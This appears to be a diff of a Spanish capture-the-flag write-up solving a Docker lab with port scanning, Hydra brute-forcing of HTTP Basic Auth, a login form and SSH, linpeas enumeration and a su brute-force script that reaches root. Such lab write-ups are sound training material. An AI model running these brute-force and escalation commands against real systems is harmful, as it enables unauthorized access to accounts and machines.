@@ -12,10 +12,10 @@ Fecha: 2026-02-26
 Comenzaremos por realizar un escaneo a la maquina para ver los vectores de entrada.
 
 ```bash
-¯é░ settarget 172.17.0.2                                              
+é settarget 172.17.0.2                                              
 TARGET establecido: 172.17.0.2
 
-¯é░ gomap -s $TARGET
+é gomap -s $TARGET
 
   ÔûêÔûêÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔòù   ÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔûêÔòù 
  ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòÉÔòØ ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòù
@@ -24,7 +24,7 @@ TARGET establecido: 172.17.0.2
  ÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔòæ ÔòÜÔòÉÔòØ ÔûêÔûêÔòæÔûêÔûêÔòæ  ÔûêÔûêÔòæÔûêÔûêÔòæ     
   ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ  ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ ÔòÜÔòÉÔòØ     ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ
 
-­ƒÄ» Scanning 172.17.0.2 (997 ports)
+­ Scanning 172.17.0.2 (997 ports)
 
 PORT    STATE  SERVICE         VERSION
 22      open   ssh             SSH-2.0 - OpenSSH 9.2p1 Debian-2+deb12u6
@@ -47,7 +47,7 @@ Nos encontramos con una solicitud de usuario y contrase├▒a, lo que nos indic
 Llegado a este punto tenemos varias opciones, la primera buscar un exploit que nos permita agilizar el trabajo: [Basic Auth](https://github.com/NexusFireMan/Exploits/tree/main/Basic-Auth-Lab)
 
 ```bash
-¯é░ python3 basic_auth_tester.py http://$TARGET -w /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
+é python3 basic_auth_tester.py http://$TARGET -w /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
 
 [+] Basic Auth lab tester
 [+] Target: http://172.17.0.2/
@@ -65,7 +65,7 @@ Gracias a este este script ya tenemos los credenciales iniciales.
 Pero tambi├®n podemos usar **Hydra** para descubrir el usuario.
 
 ```bash
-¯é░ hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt http-get://$TARGET
+é hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt http-get://$TARGET
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-26 15:22:36
@@ -82,7 +82,7 @@ En cualquiera de los 2 casos ya tenemos las credenciales para ver que hay dentro
 Y nos encontramos con la pagina por defecto de Apache y nada mas, nos toca realizar una enumeraci├│n de archivos y directorios.
 
 ```bash
-¯é░ gobuster dir -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt,bak -U httpadmin -P fhttpadmin
+é gobuster dir -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x html,php,txt,bak -U httpadmin -P fhttpadmin
 ===============================================================
 Gobuster v3.8.2
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -139,7 +139,7 @@ head -n 300 rockyou.txt > 300-rockyou.txt
 Ahora le lanzamos el ataque para encontrar las credenciales.
 
 ```bash
-¯é░ hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/300-rockyou.txt 172.17.0.2 http-post-form "/login.php:username=^USER^&password=^PASS^:H=Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=:F=Credenciales incorrectas." 
+é hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/300-rockyou.txt 172.17.0.2 http-post-form "/login.php:username=^USER^&password=^PASS^:H=Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=:F=Credenciales incorrectas." 
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-26 16:25:16
@@ -159,7 +159,7 @@ Bien, con estos credenciales vamos a por el siguiente paso.
 Despu├®s de iniciar sesi├│n vemos este mensaje del usuario **balutin** y dicho esto, vamos por el *SSH* a ver si tenemos suerte.
 
 ```bash
-¯é░ hydra -l balutin -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
+é hydra -l balutin -P /usr/share/wordlists/rockyou.txt $TARGET -t 5 ssh
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-26 16:31:09
@@ -201,11 +201,11 @@ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 Pero este servidor no tiene *curl* y tampoco lo podemos instalar, as├¡ que tendremos que descargarlo en nuestra maquina y despu├®s subirlo.
 
 ```bash
-¯é░ curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
+é curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
 
-¯é░ chmod +x linpeas.sh 
+é chmod +x linpeas.sh 
 
-¯é░ scp linpeas.sh balutin@$TARGET:/tmp/
+é scp linpeas.sh balutin@$TARGET:/tmp/
 ```
 
 Ahora volvemos a conectar con la maquina y vemos que informaci├│n nos arroja *linpeas*.
@@ -242,19 +242,19 @@ Encontr├® un script que es posible que nos sirva de algo [suBruteForce.sh](ht
 As├¡ que volvemos a lo de antes, descargar y subir.
 
 ``` bash
-¯é░ curl -L https://raw.githubusercontent.com/D1se0/suBruteforce/refs/heads/main/suBruteforceBash/suBruteforce.sh > suBruteforce.sh
+é curl -L https://raw.githubusercontent.com/D1se0/suBruteforce/refs/heads/main/suBruteforceBash/suBruteforce.sh > suBruteforce.sh
 
-¯é░ chmod +x suBruteforce.sh
+é chmod +x suBruteforce.sh
 
-¯é░ scp suBruteforce.sh balutin@$TARGET:/tmp/
+é scp suBruteforce.sh balutin@$TARGET:/tmp/
 
-¯é░ scp /usr/share/wordlists/rockyou.txt balutin@$TARGET:/tmp/
+é scp /usr/share/wordlists/rockyou.txt balutin@$TARGET:/tmp/
 ```
 
 Tambi├®n tenemos que subir un diccionario para las contrase├▒as, as├¡ que hemos subido *rockyou.txt*.
 
 ```bash
-¯é░ ssh balutin@$TARGET                                                                                                            
+é ssh balutin@$TARGET                                                                                                            
 balutin@172.17.0.2's password: 
 Linux 4cf1f32d9e59 6.18.9+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.18.9-1kali1 (2026-02-10) x86_64
 
@@ -294,3 +294,4 @@ root@4cf1f32d9e59:/tmp#
 Con esto ya hemos comprometido el laboratorio y lo hemos finalizado.
 
 La verdad que has esta un poco liado el tema de acceder como root pero ha sido interesante el poder usar varias t├®cnicas hasta conseguirlo.
+
